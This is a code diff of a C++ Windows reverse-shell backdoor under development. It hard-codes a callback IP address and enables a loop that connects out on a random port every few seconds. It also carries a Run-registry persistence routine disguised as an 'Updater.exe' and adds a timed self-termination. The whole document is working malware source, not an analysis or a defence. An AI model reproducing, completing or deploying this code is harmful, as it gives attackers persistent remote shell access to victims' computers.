@@ -1,3 +1,5 @@
+#define _CRT_SECURE_NO_WARNINGS
+
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
@@ -10,6 +12,8 @@
 #include <algorithm>
 #include <string>
 #include <regex>
+#include <chrono>
+#include <ctime>
 
 using namespace std;
 #pragma comment(lib, "Ws2_32.lib")
@@ -39,34 +43,67 @@ void MooveExe() {
 void CreateKey() {
 	std::wstring progPath = L"C:\\Windows\\Tasks\\Updater.exe";
 	HKEY hkey = NULL;
-	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
-	LONG status = RegSetValueEx(hkey, L"Update", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
+	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
+	LONG status = RegSetValueEx(hkey, "Update", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));
 }
 
-int main(int argc, char** argv) {
-	FreeConsole(); // This is the way to make the cmd vanish
-	char rhost[] = "xxxxxxxxxxxxx"; // ip to connect to
+void KillProcessById(DWORD pid) {
+	HANDLE hnd;
+	hnd = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
+	TerminateProcess(hnd, 0);
+}
 
-	int low_dist = 1000;
+
+int main(int argc, char** argv) {								
+	//FreeConsole(); // This is the way to make the cmd vanish
+	char rhost[] = "51.75.30.35"; // ip to connect to
+
+	int low_dist = 1100;
 	int high_dist = 2000;
 	std::srand((unsigned int)std::time(nullptr));
 	int port = low_dist + std::rand() % (high_dist - low_dist);
+	printf("[*] Using port ... \n");
 	cout << port << "\n";
-		
+	//Sleep(3000);
+	// variables to store date and time components
+	int hours, minutes, seconds, day, month, year;
+
+	// time_t is arithmetic time type
+	time_t now;
+	time(&now);
+	struct tm* local = localtime(&now);
+
+	hours = local->tm_hour;          // get hours since midnight (0-23)
+	minutes = local->tm_min;         // get minutes passed after the hour (0-59)
+	seconds = local->tm_sec;         // get seconds passed after minute (0-59)
+
+	day = local->tm_mday;            // get day of month (1 to 31)
+	month = local->tm_mon + 1;       // get month of year (0 to 11)
+	year = local->tm_year + 1900;    // get year since 1900
+
+	std::string h = std::to_string(hours);
+	std::string m = std::to_string(minutes);
+
+
 	//MooveExe();
 	//CreateKey();
-	/*while (1) {
+	while (1) {
 		BindSock(rhost, port);
-		Sleep(60000);
-	}*/
-	return 0;	
+		Sleep(3000);
+		if (h == "11" && m == "0") {
+			printf("[X] Killing process");
+			DWORD pid = GetCurrentProcessId();
+			KillProcessById(pid);
+		}
+
+	}
+	return 0;
 }
 
 
 
 void BindSock(char* rhost, int rport) {
-	
-	cout << rport << "\n";
+
 	SECURITY_ATTRIBUTES saAttr;
 	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
 	saAttr.bInheritHandle = TRUE;
@@ -126,5 +163,5 @@ void BindSock(char* rhost, int rport) {
 	WaitForSingleObject(pi.hProcess, INFINITE);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
-	
+
 }
